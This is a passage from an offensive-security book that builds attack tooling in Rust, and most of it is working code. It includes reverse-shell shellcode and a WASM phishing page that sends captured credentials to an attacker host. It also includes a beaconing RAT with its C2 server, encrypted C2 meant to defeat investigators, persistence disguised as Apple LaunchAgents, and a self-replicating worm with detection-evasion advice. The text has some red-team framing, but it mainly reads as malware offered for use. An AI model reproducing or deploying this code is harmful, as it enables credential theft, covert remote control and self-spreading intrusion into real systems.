    // Phase 2: Execute the exploit and return a shell/access
    pub async fn exploit(&self) -> Result<Shell, Box<dyn std::error::Error>> {
        todo!("Implement exploit logic")
    }

    // Phase 3: Post-exploitation — enumerate, persist, pivot
    pub async fn post_exploit(&self, shell: &Shell) -> Result<(), Box<dyn std::error::Error>> {
        todo!("Implement post-exploitation")
    }
}
```

### 7.3 Network Protocol Implementation

Many exploits require speaking a specific binary protocol. Rust's strong typing makes protocol implementation reliable. Consider a custom binary protocol:

```
Packet format:
[4 bytes magic] [2 bytes type] [4 bytes length] [N bytes payload]
```

```rust
use bytes::{Buf, BufMut, Bytes, BytesMut};

const MAGIC: u32 = 0xDEADBEEF;

#[repr(u16)]
#[derive(Debug, Clone, Copy)]
enum PacketType {
    Hello = 0x01,
    Command = 0x02,
    Response = 0x03,
    Error = 0xFF,
}

struct Packet {
    packet_type: PacketType,
    payload: Vec<u8>,
}

impl Packet {
    fn serialize(&self) -> Vec<u8> {
        let mut buf = BytesMut::new();
        buf.put_u32(MAGIC);
        buf.put_u16(self.packet_type as u16);
        buf.put_u32(self.payload.len() as u32);
        buf.put_slice(&self.payload);
        buf.to_vec()
    }

    fn deserialize(data: &[u8]) -> Result<Self, &'static str> {
        if data.len() < 10 { return Err("packet too short"); }

        let mut cursor = std::io::Cursor::new(data);
        let magic = cursor.get_u32();
        if magic != MAGIC { return Err("invalid magic"); }

        let ptype = cursor.get_u16();
        let length = cursor.get_u32() as usize;

        if cursor.remaining() < length {
            return Err("incomplete payload");
        }

        let mut payload = vec![0u8; length];
        cursor.copy_to_slice(&mut payload);

        Ok(Packet {
            packet_type: unsafe { std::mem::transmute(ptype) },
            payload,
        })
    }
}
```

### 7.4 Format String Exploitation (Conceptual)

Format string vulnerabilities occur when user input is passed directly as the format argument to `printf`-style functions. In C:

```c
// Vulnerable
printf(user_input);

// Safe
printf("%s", user_input);
```

An attacker can use format specifiers like `%x` to read stack values, or `%n` to write to arbitrary memory addresses. Understanding this class is essential for writing exploits targeting legacy C code.

When writing exploit tooling in Rust to interact with such targets:

```rust
fn generate_format_string_payload(
    read_count: usize,  // number of %x to read stack
    write_addr: u32,    // address to write to
    write_value: u32,   // value to write
) -> Vec<u8> {
    let mut payload = String::new();

    // Read `read_count` values off the stack
    for _ in 0..read_count {
        payload.push_str("%08x.");
    }

    // %n writes the number of characters printed so far to the pointed address
    // Prepend the target address as bytes in the payload
    // (Full Pwntools-style automation is left as exercise)

    payload.into_bytes()
}
```

---

## Chapter 8 — Writing Shellcodes with `no_std` <a name="chapter-8"></a>

### 8.1 What is Shellcode?

Shellcode is position-independent machine code injected into a target process to be executed in the context of that process. The term originates from its original use — spawning a shell — but modern shellcode does far more: downloading and executing payloads, establishing reverse connections, or loading a full implant.

Shellcode has strict constraints:

1. **Position-independent** — it may be loaded at any address; absolute memory references are forbidden
2. **No standard library** — the target process doesn't have our libc linked; we must use syscalls directly
3. **Small footprint** — shellcode is often delivered through narrow channels (overflow buffers, encoded payloads)
4. **No null bytes** (often) — C string functions stop at null bytes; shellcode containing `\x00` will be truncated

Historically, shellcode was written in assembly. Rust's `no_std` support allows writing shellcode in Rust — leveraging the type system and higher-level constructs while compiling to raw machine code.

### 8.2 The `no_std` Environment

Standard Rust programs depend on `libstd`, which itself depends on `libc` and the OS. Removing `std` strips away:

- Dynamic memory allocation (`Vec`, `Box`, `String`)
- I/O (`println!`, files, sockets via std API)
- Threading
- Panic infrastructure

What remains: core language features, primitive types, arithmetic, bitwise operations, and direct system call access.

```rust
// Tell Rust: do not link the standard library
#![no_std]
// Tell Rust: we define our own entry point
#![no_main]

// We must provide a panic handler
use core::panic::PanicInfo;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
```

### 8.3 Linux Syscalls from Rust

Without libc, we invoke OS functionality via syscalls directly using the `syscall` instruction (on x86-64):

```rust
#![no_std]
#![no_main]

use core::arch::asm;

// Raw syscall wrappers
unsafe fn syscall1(num: u64, a1: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") num,
        in("rdi") a1,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall3(num: u64, a1: u64, a2: u64, a3: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") num,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

// Linux syscall numbers for x86-64
const SYS_WRITE: u64 = 1;
const SYS_EXIT: u64 = 60;
const STDOUT: u64 = 1;

#[no_mangle]
pub unsafe extern "C" fn _start() {
    let msg = b"Hello from shellcode!\n";
    syscall3(SYS_WRITE, STDOUT, msg.as_ptr() as u64, msg.len() as u64);
    syscall1(SYS_EXIT, 0);
}
```

### 8.4 TCP Reverse Shell Shellcode

The canonical shellcode payload: connect back to the attacker's machine and provide an interactive shell.

```rust
// Linux syscall numbers
const SYS_SOCKET: u64 = 41;
const SYS_CONNECT: u64 = 42;
const SYS_DUP2: u64 = 33;
const SYS_EXECVE: u64 = 59;

// AF_INET=2, SOCK_STREAM=1
const AF_INET: u32 = 2;
const SOCK_STREAM: u32 = 1;

#[repr(C)]
struct SockaddrIn {
    sin_family: u16,  // AF_INET
    sin_port: u16,    // port in network byte order (big-endian)
    sin_addr: u32,    // IP in network byte order
    padding: [u8; 8],
}

pub unsafe fn reverse_shell(attacker_ip: u32, attacker_port: u16) {
    // 1. Create socket
    let sockfd = syscall3(SYS_SOCKET, AF_INET as u64, SOCK_STREAM as u64, 0);

    // 2. Connect to attacker
    let addr = SockaddrIn {
        sin_family: AF_INET as u16,
        sin_port: attacker_port.to_be(), // big-endian
        sin_addr: attacker_ip,           // already big-endian
        padding: [0u8; 8],
    };

    syscall3(
        SYS_CONNECT,
        sockfd,
        &addr as *const _ as u64,
        core::mem::size_of::<SockaddrIn>() as u64,
    );

    // 3. Redirect stdin/stdout/stderr to socket
    for fd in 0u64..3 {
        syscall3(SYS_DUP2, sockfd, fd, 0);
    }

    // 4. Execute /bin/sh
    let shell = b"/bin/sh\0";
    let args: [*const u8; 2] = [shell.as_ptr(), core::ptr::null()];

    syscall3(
        SYS_EXECVE,
        shell.as_ptr() as u64,
        args.as_ptr() as u64,
        0,
    );
}
```

### 8.5 Compiling Position-Independent Shellcode

```toml
# .cargo/config.toml
[build]
target = "x86_64-unknown-linux-musl"

[profile.release]
opt-level = "s"    # optimize for size
lto = true
panic = "abort"
strip = true
```

```bash
# Compile to a raw binary (not ELF)
cargo build --release

# Extract .text section as raw shellcode
objcopy -O binary \
  --only-section=.text \
  target/x86_64-unknown-linux-musl/release/shellcode \
  shellcode.bin

# Verify — should be small, no null bytes (check with hexdump)
hexdump -C shellcode.bin | head -20
```

---

## Chapter 9 — Phishing with WebAssembly <a name="chapter-9"></a>

### 9.1 Social Engineering as an Attack Vector

When no exploitable technical vulnerability exists, the human element remains the most reliable attack vector. Social engineering — manipulating humans into performing actions or divulging information — underpins the majority of successful breaches:

- **Phishing** — fraudulent emails directing targets to credential-harvesting pages
- **Spear phishing** — targeted phishing using personal information to increase believability
- **Watering hole attacks** — compromise websites frequently visited by the target population
- **Pretexting** — constructing a fabricated scenario to manipulate the target

Advanced phishing pages go beyond static HTML clones. They actively detect browser fingerprints, verify the target is the intended victim, and serve different content based on context.

### 9.2 WebAssembly for Advanced Phishing

WebAssembly (WASM) is a binary instruction format that runs in all modern browsers at near-native speed. For phishing, WASM provides:

- **Obfuscation** — WASM bytecode is harder to analyze than JavaScript
- **Anti-analysis techniques** — detect headless browsers, virtualization, and security tools
- **Complex credential harvesting** — keylogging, form interception, session hijacking
- **Evasion** — AV/proxy solutions that scan JavaScript often miss WASM payloads

```bash
# Add the WASM target
rustup target add wasm32-unknown-unknown

# Install wasm-pack for browser integration
cargo install wasm-pack
```

```toml
[lib]
crate-type = ["cdylib"]

[dependencies]
wasm-bindgen = "0.2"
web-sys = { version = "0.3", features = [
    "Window", "Document", "HtmlInputElement",
    "Navigator", "Screen", "Location",
    "XmlHttpRequest", "FormData",
]}
js-sys = "0.3"
```

### 9.3 Browser Fingerprinting in Rust/WASM

```rust
use wasm_bindgen::prelude::*;
use web_sys::{window, Navigator};

#[wasm_bindgen]
pub fn fingerprint() -> String {
    let win = window().unwrap();
    let nav = win.navigator();
    let screen = win.screen().unwrap();

    let user_agent = nav.user_agent().unwrap_or_default();
    let platform = nav.platform().unwrap_or_default();
    let language = nav.language().unwrap_or_default();
    let screen_width = screen.width().unwrap_or(0);
    let screen_height = screen.height().unwrap_or(0);

    format!(
        "ua={}&plat={}&lang={}&res={}x{}",
        user_agent, platform, language, screen_width, screen_height
    )
}

#[wasm_bindgen]
pub fn detect_headless() -> bool {
    let win = window().unwrap();
    let nav = win.navigator();

    // Headless Chrome indicator
    let ua = nav.user_agent().unwrap_or_default();
    if ua.contains("HeadlessChrome") {
        return true;
    }

    // Zero-width screen dimensions suggest automation
    let screen = win.screen().unwrap();
    let width = screen.width().unwrap_or(0);
    if width == 0 {
        return true;
    }

    false
}
```

### 9.4 Credential Interception

```rust
use wasm_bindgen::prelude::*;
use web_sys::{Document, HtmlInputElement, Event};

#[wasm_bindgen]
pub fn intercept_form(form_id: &str) {
    let win = window().unwrap();
    let doc = win.document().unwrap();

    // Hook the form's submit event
    let form = doc.get_element_by_id(form_id).unwrap();

    let closure = Closure::wrap(Box::new(move |event: Event| {
        event.prevent_default();

        let doc = window().unwrap().document().unwrap();

        let username = doc
            .query_selector("input[type='text'], input[type='email']")
            .ok()
            .flatten()
            .and_then(|el| el.dyn_into::<HtmlInputElement>().ok())
            .map(|input| input.value())
            .unwrap_or_default();

        let password = doc
            .query_selector("input[type='password']")
            .ok()
            .flatten()
            .and_then(|el| el.dyn_into::<HtmlInputElement>().ok())
            .map(|input| input.value())
            .unwrap_or_default();

        // Exfiltrate credentials
        exfiltrate(&username, &password);

        // Submit the real form to avoid suspicion
        // (redirect to legitimate site after a brief delay)
    }) as Box<dyn FnMut(_)>);

    form.add_event_listener_with_callback("submit", closure.as_ref().unchecked_ref())
        .unwrap();
    closure.forget();
}

fn exfiltrate(username: &str, password: &str) {
    let win = window().unwrap();
    let xhr = web_sys::XmlHttpRequest::new().unwrap();

    // Beacon credentials to attacker-controlled server
    let url = format!(
        "https://attacker-c2.example.com/collect?u={}&p={}",
        js_sys::encode_uri_component(username),
        js_sys::encode_uri_component(password),
    );

    xhr.open_with_async("GET", &url, true).unwrap();
    xhr.send().unwrap();
}
```

### 9.5 Building and Deploying the WASM Payload

```bash
wasm-pack build --target web --release

# Output in pkg/:
#   - your_lib_bg.wasm (the compiled WASM binary)
#   - your_lib.js (JS glue code)
```

```html
<!-- Phishing page HTML -->
<!DOCTYPE html>
<html>
<head><title>Login — Your Bank</title></head>
<body>
  <!-- Convincing clone of target login page -->
  <form id="login-form">
    <input type="email" placeholder="Email">
    <input type="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>

  <script type="module">
    import init, { intercept_form, detect_headless, fingerprint } from './pkg/phish.js';

    async function main() {
      await init();

      // Bail if running in a sandboxed analysis environment
      if (detect_headless()) {
        // Render benign content
        document.body.innerHTML = '<p>Please enable JavaScript.</p>';
        return;
      }

      // Send fingerprint before any interaction
      const fp = fingerprint();
      navigator.sendBeacon('/fp', fp);

      // Hook the form
      intercept_form('login-form');
    }

    main();
  </script>
</body>
</html>
```

---

## Chapter 10 — Building a Modern RAT <a name="chapter-10"></a>

### 10.1 Remote Access Tool Architecture

A Remote Access Tool (RAT) — also called an implant, agent, or beacon — is software that runs on a compromised system and provides remote control to the operator. Modern RATs differ significantly from their 1990s predecessors:

**Pull-based (beacon) model** — the implant periodically checks in with the C2 server to retrieve tasks, rather than maintaining a persistent open connection. This is more resilient (survives network interruptions) and harder to detect (no long-lived inbound connections, only periodic outbound HTTPS to a legitimate-looking domain).

**Encrypted communications** — all traffic between implant and C2 is encrypted, preventing network inspection and making incident response harder.

**Modular capabilities** — commands are loaded dynamically, minimizing the initial binary footprint.

**Persistence** — the implant re-establishes itself after reboot via registry keys (Windows), LaunchAgents (macOS), or systemd units/cron jobs (Linux).

### 10.2 C2 Infrastructure Design

```
Operator workstation
        │
        │ HTTPS
        ▼
   C2 Server (VPS)
  ┌─────────────┐
  │  REST API   │
  │  + Database │
  └─────────────┘
        ▲
        │ HTTPS beacon (every N seconds)
        │
   Compromised host (implant running)
```

The C2 server exposes a REST API. The implant polls this API on a configurable interval, retrieves pending tasks, executes them, and posts results back.

### 10.3 Server Implementation

```toml
# server/Cargo.toml
[dependencies]
actix-web = "4"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
sqlx = { version = "0.7", features = ["sqlite", "runtime-tokio-native-tls"] }
uuid = { version = "1", features = ["v4"] }
tokio = { version = "1", features = ["full"] }
```

```rust
use actix_web::{web, App, HttpServer, HttpResponse};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Debug, Serialize, Deserialize, sqlx::FromRow)]
struct Agent {
    id: String,
    hostname: String,
    username: String,
    os: String,
    ip: String,
    last_seen: i64,
}

#[derive(Debug, Serialize, Deserialize, sqlx::FromRow)]
struct Task {
    id: String,
    agent_id: String,
    command: String,
    status: String,  // "pending", "running", "completed"
    result: Option<String>,
    created_at: i64,
}

// Implant checks in — registers itself and retrieves pending tasks
async fn checkin(
    db: web::Data<sqlx::SqlitePool>,
    agent_info: web::Json<AgentInfo>,
) -> HttpResponse {
    // Upsert agent record
    sqlx::query!(
        "INSERT OR REPLACE INTO agents (id, hostname, username, os, ip, last_seen)
         VALUES (?, ?, ?, ?, ?, strftime('%s','now'))",
        agent_info.id, agent_info.hostname, agent_info.username,
        agent_info.os, agent_info.ip
    )
    .execute(db.get_ref())
    .await
    .unwrap();

    // Retrieve pending tasks for this agent
    let tasks = sqlx::query_as!(
        Task,
        "SELECT * FROM tasks WHERE agent_id = ? AND status = 'pending'",
        agent_info.id
    )
    .fetch_all(db.get_ref())
    .await
    .unwrap();

    HttpResponse::Ok().json(tasks)
}

// Implant posts task results
async fn post_result(
    db: web::Data<sqlx::SqlitePool>,
    result: web::Json<TaskResult>,
) -> HttpResponse {
    sqlx::query!(
        "UPDATE tasks SET status = 'completed', result = ? WHERE id = ?",
        result.output, result.task_id
    )
    .execute(db.get_ref())
    .await
    .unwrap();

    HttpResponse::Ok().finish()
}
```

### 10.4 Implant Implementation

```toml
# implant/Cargo.toml
[dependencies]
reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
tokio = { version = "1", features = ["full"] }
uuid = { version = "1", features = ["v4"] }
```

```rust
use std::time::Duration;
use serde::{Deserialize, Serialize};

const C2_URL: &str = "https://c2.attacker.com";
const BEACON_INTERVAL_SECS: u64 = 30;

#[derive(Serialize)]
struct AgentInfo {
    id: String,
    hostname: String,
    username: String,
    os: String,
    ip: String,
}

#[derive(Deserialize)]
struct Task {
    id: String,
    command: String,
}

#[derive(Serialize)]
struct TaskResult {
    task_id: String,
    output: String,
}

async fn execute_command(command: &str) -> String {
    #[cfg(target_os = "windows")]
    let output = tokio::process::Command::new("cmd")
        .args(["/C", command])
        .output()
        .await;

    #[cfg(not(target_os = "windows"))]
    let output = tokio::process::Command::new("sh")
        .args(["-c", command])
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("error: {}", e),
    }
}

async fn beacon_loop(client: &reqwest::Client, agent_info: &AgentInfo) {
    loop {
        // Check in and retrieve tasks
        if let Ok(resp) = client
            .post(format!("{}/api/checkin", C2_URL))
            .json(agent_info)
            .send()
            .await
        {
            if let Ok(tasks) = resp.json::<Vec<Task>>().await {
                for task in tasks {
                    let output = execute_command(&task.command).await;

                    let result = TaskResult {
                        task_id: task.id,
                        output,
                    };

                    let _ = client
                        .post(format!("{}/api/result", C2_URL))
                        .json(&result)
                        .send()
                        .await;
                }
            }
        }

        tokio::time::sleep(Duration::from_secs(BEACON_INTERVAL_SECS)).await;
    }
}

#[tokio::main]
async fn main() {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(false)
        .build()
        .unwrap();

    let agent_id = uuid::Uuid::new_v4().to_string();

    let agent_info = AgentInfo {
        id: agent_id,
        hostname: hostname::get()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string(),
        username: std::env::var("USER")
            .or(std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string()),
        os: std::env::consts::OS.to_string(),
        ip: "".to_string(), // server can derive from connection
    };

    beacon_loop(&client, &agent_info).await;
}
```

---

## Chapter 11 — Securing C2 with End-to-End Encryption <a name="chapter-11"></a>

### 11.1 Why Encrypt C2 Traffic?

Using HTTPS alone is insufficient for operational security. HTTPS protects against network observers — but your C2 server itself can be seized, subpoenaed, or compromised. If raw commands and results are stored on the server, they become evidence.

End-to-end encryption (E2EE) ensures that **only the operator's workstation and the implant can decrypt the content** — the C2 server sees only ciphertext. Even a full compromise of the server yields no readable commands, results, or victim data.

Additionally, certificate pinning in the implant prevents man-in-the-middle attacks by defenders who present a fake TLS certificate to intercept traffic.

### 11.2 Choosing a Cryptographic Protocol

Modern asymmetric cryptography for E2EE typically uses:

**X25519 (ECDH)** — Elliptic-Curve Diffie-Hellman key exchange using Curve25519. Fast, secure, and with a 32-byte key size. Used to establish a shared secret.

**ChaCha20-Poly1305** — Authenticated encryption (AEAD cipher). Faster than AES on systems without hardware AES acceleration (common on embedded/ARM targets). Provides both confidentiality and integrity.

**BLAKE3** — Fast cryptographic hash function for key derivation and message authentication.

The handshake:

```
Operator generates:    (operator_private, operator_public) = X25519::generate()
Implant generates:     (implant_private, implant_public)   = X25519::generate()

# At build time, operator_public is hardcoded into the implant binary
# implant_public is sent in the first beacon

Shared secret = X25519::diffie_hellman(implant_private, operator_public)
             = X25519::diffie_hellman(operator_private, implant_public)

session_key = BLAKE3::derive_key("c2-session-v1", shared_secret)
```

### 11.3 Implementation with `ring` and `chacha20poly1305`

```toml
[dependencies]
x25519-dalek = { version = "2", features = ["static_secrets"] }
chacha20poly1305 = "0.10"
blake3 = "1"
rand = "0.8"
```

```rust
use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305, Key, Nonce,
};
use blake3::Hasher;

// Embedded at compile time — operator's public key
const OPERATOR_PUBLIC_KEY: [u8; 32] = [
    // Replace with actual key bytes
    0x00, 0x01, 0x02, /* ... */ 0x1f,
];

pub struct CryptoSession {
    cipher: ChaCha20Poly1305,
}

impl CryptoSession {
    pub fn new(implant_ephemeral_secret: EphemeralSecret) -> (Self, [u8; 32]) {
        let operator_public = PublicKey::from(OPERATOR_PUBLIC_KEY);
        let implant_public: [u8; 32] = PublicKey::from(&implant_ephemeral_secret).to_bytes();

        // Compute shared secret via ECDH
        let shared = implant_ephemeral_secret.diffie_hellman(&operator_public);

        // Derive session key via BLAKE3
        let mut hasher = Hasher::new_derive_key("c2-session-v1");
        hasher.update(shared.as_bytes());
        let session_key = hasher.finalize();

        let key = Key::from_slice(session_key.as_bytes());
        let cipher = ChaCha20Poly1305::new(key);

        (CryptoSession { cipher }, implant_public)
    }

    pub fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        // Generate a random 96-bit nonce
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);

        let ciphertext = self.cipher
            .encrypt(&nonce, plaintext)
            .expect("encryption failed");

        // Prepend nonce to ciphertext: [12 bytes nonce][ciphertext+tag]
        let mut result = nonce.to_vec();
        result.extend(ciphertext);
        result
    }

    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, &'static str> {
        if data.len() < 12 {
            return Err("data too short");
        }

        let nonce = Nonce::from_slice(&data[..12]);
        let ciphertext = &data[12..];

        self.cipher
            .decrypt(nonce, ciphertext)
            .map_err(|_| "decryption failed")
    }
}
```

### 11.4 Certificate Pinning

```rust
fn build_pinned_client(expected_cert_hash: &[u8]) -> reqwest::Client {
    // Load the certificate from a known-good DER file embedded at compile time
    let cert_der = include_bytes!("../certs/c2_cert.der");
    let cert = reqwest::Certificate::from_der(cert_der).unwrap();

    reqwest::Client::builder()
        .tls_built_in_root_certs(false) // do NOT trust system CA store
        .add_root_certificate(cert)     // only trust our pinned cert
        .build()
        .unwrap()
}
```

---

## Chapter 12 — Cross-Platform Implants <a name="chapter-12"></a>

### 12.1 The Multi-Platform Challenge

Modern enterprise environments are heterogeneous. A red team engagement might require implants running on:

- Windows 10/11 (x86-64, ARM64)
- macOS (Intel x86-64 and Apple Silicon ARM64)
- Linux (x86-64, ARM, MIPS — routers, IoT)

Writing and maintaining separate codebases for each platform is wasteful. Rust's cross-compilation story enables a single codebase to produce binaries for all targets.

### 12.2 Conditional Compilation

Rust's `cfg` attribute enables platform-specific code at compile time — with zero runtime overhead for the non-selected branches:

```rust
// Platform-agnostic persistence mechanism

pub fn install_persistence(name: &str, binary_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    return windows::install_registry_persistence(name, binary_path);

    #[cfg(target_os = "macos")]
    return macos::install_launch_agent(name, binary_path);

    #[cfg(target_os = "linux")]
    return linux::install_systemd_unit(name, binary_path);

    #[cfg(not(any(
        target_os = "windows",
        target_os = "macos",
        target_os = "linux"
    )))]
    Err("unsupported platform".into())
}
```

### 12.3 Windows Persistence via Registry

```rust
#[cfg(target_os = "windows")]
mod windows {
    use winreg::enums::*;
    use winreg::RegKey;

    pub fn install_registry_persistence(
        name: &str,
        binary_path: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_WRITE,
        )?;

        run_key.set_value(name, &binary_path)?;
        Ok(())
    }

    pub fn get_username() -> String {
        std::env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string())
    }

    pub fn get_hostname() -> String {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
    }
}
```

### 12.4 macOS Persistence via LaunchAgent

```rust
#[cfg(target_os = "macos")]
mod macos {
    use std::fs;
    use std::path::PathBuf;

    pub fn install_launch_agent(
        name: &str,
        binary_path: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let home = std::env::var("HOME")?;
        let plist_dir = PathBuf::from(&home)
            .join("Library/LaunchAgents");

        fs::create_dir_all(&plist_dir)?;

        let plist_content = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.{name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{binary}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"#,
            name = name,
            binary = binary_path,
        );

        let plist_path = plist_dir.join(format!("com.apple.{}.plist", name));
        fs::write(&plist_path, plist_content)?;

        // Load immediately
        std::process::Command::new("launchctl")
            .args(["load", plist_path.to_str().unwrap()])
            .output()?;

        Ok(())
    }
}
```

### 12.5 Cross-Compilation Build Matrix

```bash
# Install cross (Docker-based cross-compilation)
cargo install cross

# Build for all targets from Linux
cross build --release --target x86_64-pc-windows-gnu
cross build --release --target x86_64-apple-darwin
cross build --release --target aarch64-apple-darwin
cross build --release --target aarch64-unknown-linux-musl
cross build --release --target armv7-unknown-linux-musleabihf  # ARM IoT
```

A CI pipeline that builds all targets on every commit ensures your implant works everywhere before you need it:

```yaml
# .github/workflows/build.yml
strategy:
  matrix:
    target:
      - x86_64-unknown-linux-musl
      - x86_64-pc-windows-gnu
      - aarch64-unknown-linux-musl

steps:
  - uses: actions/checkout@v3
  - name: Build ${{ matrix.target }}
    run: cross build --release --target ${{ matrix.target }}
  - uses: actions/upload-artifact@v3
    with:
      name: implant-${{ matrix.target }}
      path: target/${{ matrix.target }}/release/implant*
```

---

## Chapter 13 — Turning a RAT into a Worm <a name="chapter-13"></a>

### 13.1 Worm Theory

A worm is self-propagating malware — it replicates across a network without requiring user interaction for each new infection. Unlike viruses (which attach to files) or trojans (which require manual execution), worms exploit network services to spread autonomously.

The worm's propagation engine consists of:

1. **Target discovery** — scan the local network for hosts running vulnerable services
2. **Exploitation** — exploit the vulnerable service to achieve code execution
3. **Payload delivery** — copy the worm binary to the new host
4. **Execution** — trigger execution of the worm on the new host
5. **Persistence** — install persistence on the new host
6. **Repeat** — the new host begins its own scanning cycle

The WannaCry ransomworm (2017) exemplified this: it spread via the EternalBlue SMB exploit, compromised a host, installed ransomware, then immediately began scanning for new victims — spreading globally in hours.

### 13.2 Network Discovery from a Compromised Host

The worm runs inside a compromised environment. It sees network interfaces the attacker cannot see from the outside — internal RFC1918 ranges, VLANs, and isolated segments.

```rust
use std::net::IpAddr;

fn get_local_networks() -> Vec<String> {
    // Get all local IP addresses and derive their /24 subnets
    // Uses the `if-addrs` crate for cross-platform interface enumeration
    if_addrs::get_if_addrs()
        .unwrap_or_default()
        .into_iter()
        .filter_map(|iface| {
            match iface.addr.ip() {
                IpAddr::V4(ip) if !ip.is_loopback() => {
                    // Derive /24 subnet: x.x.x.0/24
                    let octets = ip.octets();
                    Some(format!("{}.{}.{}.0/24", octets[0], octets[1], octets[2]))
                }
                _ => None,
            }
        })
        .collect()
}
```

### 13.3 Reusing the Scanner Module

The worm reuses the async scanner from Chapter 3 to perform internal network reconnaissance:

```rust
async fn discover_targets(networks: Vec<String>) -> Vec<(String, u16)> {
    let vulnerable_ports = vec![22, 445, 3389, 8080, 9200]; // SSH, SMB, RDP, HTTP, Elasticsearch

    let mut targets = Vec::new();

    for network in networks {
        let hosts = expand_cidr(&network);

        for host in hosts {
            for &port in &vulnerable_ports {
                if probe_port(&host, port).await {
                    targets.push((host.clone(), port));
                }
            }
        }
    }

    targets
}
```

### 13.4 Self-Replication Mechanism

Once a new target is identified and exploited, the worm copies itself:

```rust
async fn replicate(client: &reqwest::Client, target_shell: &RemoteShell) -> Result<(), Box<dyn std::error::Error>> {
    // Read our own binary
    let our_binary_path = std::env::current_exe()?;
    let binary_data = tokio::fs::read(&our_binary_path).await?;

    // Determine remote temp directory
    let tmp_dir = target_shell.execute("echo $TMPDIR || echo /tmp").await?;
    let remote_path = format!("{}/sysupdate", tmp_dir.trim());

    // Upload our binary to the target
    // (via whatever access mechanism the exploit provided)
    target_shell.upload(&binary_data, &remote_path).await?;

    // Make executable and run
    target_shell.execute(&format!("chmod +x {} && {} &", remote_path, remote_path)).await?;

    Ok(())
}
```

### 13.5 Propagation Rate Limiting

An unconstrained worm is operationally dangerous — it can saturate network bandwidth, crash systems under load, and create highly visible traffic signatures. A professional-grade worm implements:

**Propagation limits** — a counter of how many hosts this instance has infected, capped at a maximum

**Sleep jitter** — random delays between propagation attempts

**Deconfliction** — a shared "infected" registry to prevent multiple worm instances from re-infecting the same host

```rust
const MAX_PROPAGATIONS: usize = 5; // This instance spreads to at most 5 new hosts

struct WormState {
    propagation_count: Arc<AtomicUsize>,
    infected: Arc<Mutex<HashSet<String>>>,
}

impl WormState {
    async fn should_propagate(&self, target: &str) -> bool {
        if self.propagation_count.load(Ordering::SeqCst) >= MAX_PROPAGATIONS {
            return false;
        }

        let mut infected = self.infected.lock().await;
        if infected.contains(target) {
            return false;
        }
        infected.insert(target.to_string());
        self.propagation_count.fetch_add(1, Ordering::SeqCst);
        true
    }
}
```

### 13.6 Evading Network Detection

Network-based intrusion detection (IDS/IPS) like Snort and Suricata use signature matching and behavioral heuristics. Key evasion principles:

**Slow scanning** — scan at 1-2 hosts per second rather than 1000/second. Below threshold for anomaly-based detection.

**Encrypted payloads** — all traffic (scanning, exploitation, propagation) tunneled through encrypted protocols (TLS, SSH). Signature-based detection fails on encrypted traffic.

**Domain fronting** — C2 traffic routed through CDN infrastructure (Cloudflare, AWS CloudFront) so network blocks of the C2 IP would also block legitimate CDN traffic.

**Process injection** — instead of running as a standalone process, inject into a legitimate system process (svchost.exe, explorer.exe) to blend with normal process activity.

---

## Chapter 14 — Conclusion <a name="chapter-14"></a>

### 14.1 What You've Built

Across these chapters, the tools constructed form a complete offensive capability chain:

| Phase | Tool | Capability |
|---|---|---|
| Reconnaissance | Multi-threaded scanner | Port and service discovery |
| Reconnaissance | Async scanner | High-speed scanning at scale |
| Reconnaissance | Modular scanner | Extensible, plugin-based analysis |
| Reconnaissance | Web crawler | OSINT and data harvesting |
| Vulnerability Research | Web fuzzer | Directory and parameter fuzzing |
| Vulnerability Research | SQLi detector | Injection vulnerability detection |
| Exploitation | Protocol exploiter | Custom binary protocol exploitation |
| Exploitation | Shellcode engine | `no_std` position-independent code |
| Initial Access | WASM phishing | Browser-based credential harvesting |
| Post-Exploitation | RAT + C2 | Remote access and command execution |
| Post-Exploitation | Encrypted RAT | E2EE C2 with certificate pinning |
| Post-Exploitation | Multi-platform implant | Windows / macOS / Linux coverage |
| Lateral Movement | Worm | Autonomous network propagation |

### 14.2 Where to Go From Here

**EDR Evasion** — Endpoint Detection and Response products (CrowdStrike, SentinelOne) monitor process behavior at the kernel level. Study `ntdll.dll` syscall patching, direct syscalls from Rust, and process hollowing.

**Kernel Exploitation** — privilege escalation via kernel vulnerabilities. Rust's ability to write safe kernel modules (Linux 6.1+ has Rust support) opens new doors.

